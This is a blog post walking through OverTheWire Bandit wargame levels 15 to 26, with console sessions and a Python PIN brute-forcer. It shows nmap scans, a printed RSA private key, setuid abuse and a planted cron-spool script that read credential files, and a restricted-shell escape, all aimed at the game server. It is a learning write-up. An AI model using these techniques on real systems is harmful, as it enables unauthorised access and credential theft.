<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Let&#39;s crack Bandit Part 2 - Unlogic</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="keywords" content="">
  <link rel="canonical" href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2/">

  
  

  
  

  
  

  <link rel="stylesheet" type="text/css" href="http://unlogic.co.uk//css/combined-min.css">

</head>
<body class="">

<div class="site-wrap">
  <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="http://unlogic.co.uk/" class="site-title">Unlogic</a>
      <nav class="site-nav right">
      <a href="http://unlogic.co.uk/tags">Tags</a>

</form>

      </nav>
      <div class="clearfix"></div>
    </div>
  </div>
</header>

  <div class="post p2 p-responsive wrap" role="main">
    <div class="measure">
      <div class="post-header mb2">
        <h1 class="py2">Let&#39;s crack Bandit Part 2</h1>
        <span class="post-meta">Mar 13, 2015 by </span><br>
        
      </div>

      <article class="post-content">
      

<p>Continues on from <a href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1">Let&rsquo;s crack Bandit Part 1</a></p>

<h1 id="level-15-16:0e66a8a07761fc75a6c8722719cf3240">Level 15 -&gt; 16</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit16.html">Level 15</a></p>

<p>Eventhough this is very similar to the previous level, it&rsquo;s a little
more complicated as we need to connect with SSL.
The simplest way is using <code>openssl</code> with <code>s_client</code>. Once connected it&rsquo;s the
same dance as above</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit15@melinda:~$</span> openssl s_client -quiet -connect localhost:30001
<span class="go">depth=0 CN = li190-250.members.linode.com</span>
<span class="go">verify error:num=18:self signed certificate</span>
<span class="go">verify return:1</span>
<span class="go">depth=0 CN = li190-250.members.linode.com</span>
<span class="go">verify return:1</span>
<span class="go">BfMYroe26WYalil77FoDi9qh59eK5xNr</span>
<span class="go">Correct!</span>
<span class="go">cluFn7wTiGryunymYOu4RcffSxQluehd</span>

<span class="go">read:errno=0</span>
</code></pre></div>


<h1 id="level-16-17:0e66a8a07761fc75a6c8722719cf3240">Level 16 -&gt; 17</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit17.html">Level 16</a></p>

<p>Here we have a choice. We run a simple ping scan across the port range and then
figure out which port is the right one by trying each one. Depending on the number
of ports open this could take a while or not.
Let&rsquo;s see how we&rsquo;re going to handle this by seeing which ports are open</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit16@melinda:~$</span> nmap localhost -p 31000-32000 

<span class="go">Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:54 UTC</span>
<span class="go">Nmap scan report for localhost (127.0.0.1)</span>
<span class="go">Host is up (0.00080s latency).</span>
<span class="go">Not shown: 996 closed ports</span>
<span class="go">PORT      STATE SERVICE</span>
<span class="go">31046/tcp open  unknown</span>
<span class="go">31518/tcp open  unknown</span>
<span class="go">31691/tcp open  unknown</span>
<span class="go">31790/tcp open  unknown</span>
<span class="go">31960/tcp open  unknown</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds</span>
</code></pre></div>


<p>Not too bad. Because it&rsquo;s a short list, we can try them one by one, or
we run a service discovery on them. Service discovery in nmap takes a while,
so I only scan the ports we are interseted in:</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit16@melinda:~$</span> nmap -sV -p 31046,31518,31691,31790,31960 localhost

<span class="go">Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:51 UTC</span>
<span class="go">Nmap scan report for localhost (127.0.0.1)</span>
<span class="go">Host is up (0.00015s latency).</span>
<span class="go">PORT      STATE SERVICE VERSION</span>
<span class="go">31046/tcp open  echo</span>
<span class="go">31518/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)</span>
<span class="go">31691/tcp open  echo</span>
<span class="go">31790/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)</span>
<span class="go">31960/tcp open  echo</span>
<span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
</code></pre></div>


<p>Now we only have two ports to try, as the others are clearly just echo ports.
Eliminating one we go ahead and</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit16@melinda:~$</span> openssl s_client -quiet -connect localhost:31790
<span class="go">depth=0 CN = li190-250.members.linode.com</span>
<span class="go">verify error:num=18:self signed certificate</span>
<span class="go">verify return:1</span>
<span class="go">depth=0 CN = li190-250.members.linode.com</span>
<span class="go">verify return:1</span>
<span class="go">cluFn7wTiGryunymYOu4RcffSxQluehd</span>
<span class="go">Correct!</span>
<span class="go">-----BEGIN RSA PRIVATE KEY-----</span>
<span class="go">MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ</span>
<span class="go">imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ</span>
<span class="go">Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu</span>
<span class="go">DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW</span>
<span class="go">JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX</span>
<span class="go">x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD</span>
<span class="go">KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl</span>
<span class="go">J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd</span>
<span class="go">d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC</span>
<span class="go">YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A</span>
<span class="go">vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama</span>
<span class="go">+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT</span>
<span class="go">8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx</span>
<span class="go">SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd</span>
<span class="go">HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt</span>
<span class="go">SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A</span>
<span class="go">R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi</span>
<span class="go">Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg</span>
<span class="go">R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu</span>
<span class="go">L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni</span>
<span class="go">blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU</span>
<span class="go">YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM</span>
<span class="go">77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b</span>
<span class="go">dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3</span>
<span class="go">vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=</span>
<span class="go">-----END RSA PRIVATE KEY-----</span>

<span class="go">read:errno=0</span>
</code></pre></div>


<p>Now copy that key into a new file and use <code>chmod go-rw key</code> to remove group
and other read/write. ssh refuses to accept a key that is read/write by
anyone other than the user who owns the file. Then simply</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit16@melinda:~$</span> ssh -i /tmp/k.key bandit17@localhost
</code></pre></div>


<h1 id="level-17-18:0e66a8a07761fc75a6c8722719cf3240">Level 17 -&gt; 18</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit18.html">Level 17</a></p>

<p>We remain logged in as bandit17 from the previous level. To compare two files
we need to do a <code>diff</code></p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit17@melinda:~$</span> diff passwords.old  passwords.new 
<span class="go">42c42</span>
<span class="go">&lt; BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR</span>
<span class="go">---</span>
<span class="gp">&gt;</span> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
</code></pre></div>


<p>The latter output is the entry in the <code>password.new</code> file, and thus the password
for bandit18.</p>

<h1 id="level-18-19:0e66a8a07761fc75a6c8722719cf3240">Level 18 -&gt; 19</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit19.html">Level 18</a></p>

<p>Oh noes. We get logged out as soon as we log in because some nefarious
individual has been editing our <code>.bashrc</code> file. Well in that case
we need to launch bash without an rc file.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">ssh bandit18@bandit.labs.overthewire.org &#39;/bin/bash --norc&#39;</span>
<span class="go">cat readme</span>
<span class="go">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span>
</code></pre></div>


<p>Because we launched without an rc file there&rsquo;s not going to be a prompt.
All we need to do is cat the <code>readme</code> file and the password is ours.</p>

<h1 id="level-19-20:0e66a8a07761fc75a6c8722719cf3240">Level 19 -&gt; 20</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit20.html">Level 19</a></p>

<p>Here we learn about setuid binaries. Basically this is a binary that a user can
run, but when executed runs as the setuid user. To explain, long list the file</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit19@melinda:~$</span> ls -al
<span class="go">total 28</span>
<span class="go">drwxr-xr-x   2 root     root     4096 Nov 14 10:32 .</span>
<span class="go">drwxr-xr-x 167 root     root     4096 Jan 12 17:44 ..</span>
<span class="go">-rw-r--r--   1 root     root      220 Apr  9  2014 .bash_logout</span>
<span class="go">-rw-r--r--   1 root     root     3637 Apr  9  2014 .bashrc</span>
<span class="go">-rw-r--r--   1 root     root      675 Apr  9  2014 .profile</span>
<span class="go">-rwsr-x---   1 bandit20 bandit19 7370 Nov 14 10:32 bandit20-do</span>
</code></pre></div>
</p>

<p>So you see it&rsquo;s owned by <code>bandit20</code> and the <em>s</em> bit is set in <code>-rwsr-x---</code>. That&rsquo;s
how we identify setuid binaries.</p>

<p>Let&rsquo;s make use of it. This will run any command we supply, as the user <code>bandit20</code>,
so let&rsquo;s simply print the password</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit19@melinda:~$</span> ./bandit20-do cat /etc/bandit_pass/bandit20
<span class="go">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span>
</code></pre></div>
</p>

<h1 id="level-20-21:0e66a8a07761fc75a6c8722719cf3240">Level 20 -&gt; 21</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit21.html">Level 20</a></p>

<p>Now we&rsquo;re entering a more complicated example of networking. Not only do we need
to connect to a host, we have to create the host to connect to. Once
<code>suconnect</code> is connected, we must pass it the password and in return we get the
one for the next level.</p>

<p>Let&rsquo;s log into a new shell to create our server with <code>netcat</code></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit20@melinda:~$</span> nc -vlk 31337
<span class="go">Listening on [0.0.0.0] (family 0, port 31337)</span>
</code></pre></div>
</p>

<p>The option <code>vlk</code> is <code>verbose</code>, <code>listen</code>, and <code>keep-open</code>. Ok, we&rsquo;re listening
and now, from another terminal, we log into level 20 and execute <code>suconnect</code>. From
our listening terminal, once we see an established connection, we send the password,
and get our new one back.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span> terminal 2
<span class="gp">bandit20@melinda:~$</span> ./suconnect  31337

<span class="gp">#</span> terminal 1
<span class="go">Connection from [127.0.0.1] port 31337 [tcp/*] accepted (family 2, sport 43463)</span>
<span class="go">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span>
<span class="go">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span>
</code></pre></div>
</p>

<h1 id="level-21-22:0e66a8a07761fc75a6c8722719cf3240">Level 21 -&gt; 22</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit22.html">Level 21</a></p>

<p>First let&rsquo;s list the crontabs in the directory supplied. Our likely
candidate is <code>/etc/cron.d/cronjob_bandit22</code> so let&rsquo;s see what it runs
and also what that script contains</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">cat /etc/cron.d/cronjob_bandit22</span>
<span class="go">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span>
<span class="gp">bandit21@melinda:~$</span> cat /usr/bin/cronjob_bandit22.sh
<span class="gp">#</span>!/bin/bash
<span class="go">chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span>
<span class="go">cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span>
</code></pre></div>
</p>

<p>So basically it copies the password for the next level into a file in <code>/tmp</code>.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit21@melinda:~$</span> cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
<span class="go">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span>
</code></pre></div>
</p>

<h1 id="level-22-23:0e66a8a07761fc75a6c8722719cf3240">Level 22 -&gt; 23</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit22.html">Level 22</a></p>

<p>Pretty similar to above but with a different script</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit22@melinda:~$</span> cat /etc/cron.d/cronjob_bandit23
<span class="go">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span>
<span class="gp">bandit22@melinda:~$</span> cat /usr/bin/cronjob_bandit23.sh
<span class="gp">#</span>!/bin/bash

<span class="go">myname=$(whoami)</span>
<span class="go">mytarget=$(echo I am user $myname | md5sum | cut -d &#39; &#39; -f 1)</span>

<span class="go">echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;</span>

<span class="go">cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget</span>
</code></pre></div>
</p>

<p>This script takes the string <code>I am user $myname</code> and hashes it with an md5
then puts the next password into a file in <code>/tmp</code> with that filename. The easiest
thing to do is to see what the filename will be. It will run as <code>bandit23</code> so
<code>whoami</code> will return that string.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit22@melinda:~$</span> <span class="nb">echo </span>I am user bandit23 <span class="p">|</span> md5sum <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f 1
<span class="go">8ca319486bfbbc3663ea0fbe81326349</span>
<span class="gp">bandit22@melinda:~$</span> cat /tmp/8ca319486bfbbc3663ea0fbe81326349
<span class="go">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span>
</code></pre></div>
</p>

<h1 id="level-23-24:0e66a8a07761fc75a6c8722719cf3240">Level 23 -&gt; 24</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit24.html">Level 23</a></p>

<p>Once again&hellip;.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit23@melinda:~$</span> cat /etc/cron.d/cronjob_bandit24
<span class="go">* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</span>
<span class="gp">bandit23@melinda:~$</span> cat /usr/bin/cronjob_bandit24.sh
<span class="gp">#</span>!/bin/bash

<span class="go">myname=$(whoami)</span>

<span class="go">cd /var/spool/$myname</span>
<span class="go">echo &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;</span>
<span class="go">for i in *;</span>
<span class="go">do</span>
<span class="go">    echo &quot;Handling $i&quot;</span>
<span class="go">    ./$i</span>
<span class="go">    rm -f $i</span>
<span class="go">done</span>
</code></pre></div>
</p>

<p>So anything in <code>/var/spool/bandit24</code> will get run as bandit24. Checking if we
can write to that directory show us</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit23@melinda:~$</span> ls -la /var/spool/
<span class="go">total 21</span>
<span class="go">drwxr-xr-x  6 root     root     4096 Nov 15 14:55 .</span>
<span class="go">drwxr-xr-x 15 root     root     4096 Nov 14 10:32 ..</span>
<span class="go">drwxrwx---  2 bandit24 bandit23 1024 Mar 20 15:38 bandit24</span>
</code></pre></div>
</p>

<p>that we can. Excellent. So let&rsquo;s write a script to cat the password to a tmp file.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!#/bin/bash</span>
<span class="go">cat /etc/bandit_pass/bandit24 &gt; /tmp/unl.pass</span>
</code></pre></div>
</p>

<p>Make it executable, copy it to the right directory and then harvest the key</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit23@melinda:/tmp$</span> chmod +x t.sh
<span class="gp">bandit23@melinda:/tmp$</span> cp t.sh /var/spool/bandit24/
<span class="gp">bandit23@melinda:/tmp$</span> cat /tmp/unl.pass
<span class="go">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span>
</code></pre></div>
</p>

<h1 id="level-24-25:0e66a8a07761fc75a6c8722719cf3240">Level 24 -&gt; 25</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit25.html">Level 24</a></p>

<p>Here we need to bruteforce our way to the password. No point entering our
tries by hand, so let&rsquo;s leverage the power of bash. First create a loop
to print the values, so we can be sure the input to the netcat command is
going to be right</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit24@melinda:~$</span> <span class="k">for</span> i in <span class="k">$(</span>seq -f <span class="s2">&quot;%04g&quot;</span> <span class="m">0</span> 9999<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s1">&#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &#39;</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span><span class="p">;</span> <span class="k">done</span>
<span class="go">.</span>
<span class="go">.</span>
<span class="go">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9856</span>
<span class="go">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9857</span>
<span class="go">.</span>
<span class="go">.</span>
</code></pre></div>
</p>

<p>seems to ne what we want. Let&rsquo;s actually pass it onto the command. Because each
iteration will take a while, we have plenty of time to stop it when it finds the
right answer</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit24@melinda:~$</span> <span class="k">for</span> i in <span class="k">$(</span>seq -f <span class="s2">&quot;%04g&quot;</span> <span class="m">0</span> 9999<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s1">&#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &#39;</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span> <span class="p">|</span> nc localhost 30002<span class="p">;</span> <span class="k">done</span> 
</code></pre></div>
</p>

<p>But who wants to sit there watching a screen? A quick Python script and we can
leave it running until it finds the right PIN.
Sometimes you just have to be patient.</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>

<span class="k">def</span> <span class="nf">netcat</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SHUT_WR</span><span class="p">)</span>
    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s">&quot;&quot;</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="k">if</span> <span class="s">&#39;I am the pincode&#39;</span> <span class="ow">in</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="s">&#39;Wrong&#39;</span> <span class="ow">in</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
            <span class="k">print</span> <span class="s">&#39;no:&#39;</span><span class="p">,</span> <span class="n">content</span>
            <span class="k">return</span> <span class="mi">0</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="k">print</span> <span class="n">content</span>
            <span class="k">return</span> <span class="mi">1</span>

    <span class="k">print</span> <span class="s">&quot;Connection closed.&quot;</span>
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">passw</span> <span class="o">=</span> <span class="s">&#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&#39;</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">trypass</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> </span><span class="si">%04d</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">passw</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">netcat</span><span class="p">(</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">30002</span><span class="p">,</span> <span class="n">trypass</span><span class="p">)):</span>
        <span class="k">break</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div>
</p>

<p>Some time passes&hellip;..</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">no: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5668</span>
<span class="go">&#39;Correct!\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\nExiting.\n&#39;</span>
<span class="go">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5669</span>
<span class="gp">bandit24@melinda:~$</span> 
</code></pre></div>
</p>

<h1 id="level-25-26:0e66a8a07761fc75a6c8722719cf3240">Level 25 -&gt; 26</h1>

<p><a href="http://overthewire.org/wargames/bandit/bandit26.html">Level 25</a></p>

<p>Ok, so first we need to see what happens when we log in as Bandit26</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit25@melinda:~$</span> ssh -i bandit26.sshkey bandit26@localhost
<span class="go">  _                     _ _ _   ___   __  </span>
<span class="go"> | |                   | (_) | |__ \ / /  </span>
<span class="go"> | |__   __ _ _ __   __| |_| |_   ) / /_  </span>
<span class="go"> | &#39;_ \ / _` | &#39;_ \ / _` | | __| / / &#39;_ \ </span>
<span class="go"> | |_) | (_| | | | | (_| | | |_ / /| (_) |</span>
<span class="go"> |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ </span>
<span class="go">Connection to localhost closed.</span>
</code></pre></div>
</p>

<p>Hrm&hellip; ok, let&rsquo;s check the shell bandit26 uses:</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">bandit25@melinda:/home/bandit25$</span> cat /etc/passwd <span class="p">|</span> grep bandit26
<span class="go">bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext</span>
<span class="gp">bandit25@melinda:/home/bandit25$</span> cat /usr/bin/showtext
<span class="gp">#</span>!/bin/sh

<span class="go">more ~/text.txt</span>
<span class="go">exit 0</span>
</code></pre></div>
</p>

<p>Interesting. So we need to break out of <code>more</code> somehow. With <code>more</code> we
can go into interactive mode if we can figure out how to pause it.
We can do that by limiting how much it can output to the screen.
The ASCII art above is about 8 lines, let&rsquo;s resize the terminal to 5 lines
or something, and when it pauses, hit &lsquo;v&rsquo; to open an editor.</p>

<p>Once in the editor simply open <code>/etc/bandit_pass/bandit26</code> and the password
is: <code>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</code></p>

<p>And that&rsquo;s the last password in the list, and thus the end of the game.</p>

<p>It was good fun and had a nice incrementing level of difficulty</p>

<p>Hope you had as much fun as me playing this. Next time we&rsquo;ll tackle <code>Leviathan</code>.</p>

      </article>

      <p class="post-meta">Tags:&nbsp;
        
            
            <a href="http://unlogic.co.uk//tags/ctf">ctf</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/security">security</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/hack">hack</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/overthewire">overthewire</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/bandit">bandit</a>
        
      </p>

      
<div id="disqus_thread">
  <script type="text/javascript">
     var disqus_shortname = "unlogic";
     var disqus_identifier = "\/2015\/03\/13\/lets-crack-bandit-part2\/";

     (function() {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
       dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
       (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
  </script>
</div>


    </div>
  </div>
</div>
    <footer class="footer">
      <div class="p2 wrap">
        <div class="measure mt1 center">
      <nav class="social-icons icons">
<a class="fa fa-rss rss" href="http://unlogic.co.uk/index.xml"></a>

<a class="fa fa-twitter twitter" href="https://twitter.com/binaryheadache"></a>

</nav>

          <small>
            Copyright &#169; 2015<br>
            Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/azmelanar/hugo-theme-pixyll" target="_blank">Pixyll</a>
          </small>
        </div>
      </div>
    </footer>

    
    <script src="http://unlogic.co.uk/js/highlight.pack.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>

    
    


</body>
</html>

